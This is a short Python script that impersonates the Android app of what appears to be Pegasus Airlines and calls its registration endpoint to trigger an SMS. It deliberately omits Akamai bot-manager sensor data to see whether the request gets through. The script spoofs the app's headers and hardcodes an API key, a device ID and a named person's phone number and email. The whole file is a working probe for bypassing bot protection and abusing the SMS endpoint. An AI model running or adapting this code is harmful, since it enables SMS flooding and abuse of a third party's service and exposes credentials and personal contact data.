import requests
import json

base_url = "https://mw.flypgs.com/pegasus"
headers = {
    "X-API-KEY": "ev1kkNxr0kRJ8xK1imrLfH55cqXZ+MW4X0pBi8EFrMI=",
    "X-FLOW-TYPE": "OTHER",
    "Accept-Language": "en",
    "X-PLATFORM": "android",
    "X-VERSION": "3.69.0",
    "X-SYSTEM-VERSION": "15",
    "X-DEVICE-ID": "1c309e657f707cff",
    "X-VENDOR": "GOOGLE",
    "User-Agent": "Pegasus/3.69.0 (Android 15; Build/AP4A.250205.002)",
    # Akamai Bot Manager Sensor Data is intentionally missing to test blocking
}

def send_sms():
    url = f"{base_url}/registration"
    data = {
        "name": "Deepanshu",
        "surname": "Singh",
        "phone": {"countryCode": "39", "areaCode": "3800", "number": "804198"},
        "email": "deepanshusinghdigitalheroes@gmail.com",
        "smsSelected": True,
        "emailSelected": True
    }
    
    print("[*] Attempting to trigger SMS via /registration without Akamai Sensor Data...")
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        print("Status Code:", response.status_code)
        print("Response:", response.text)
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    send_sms()
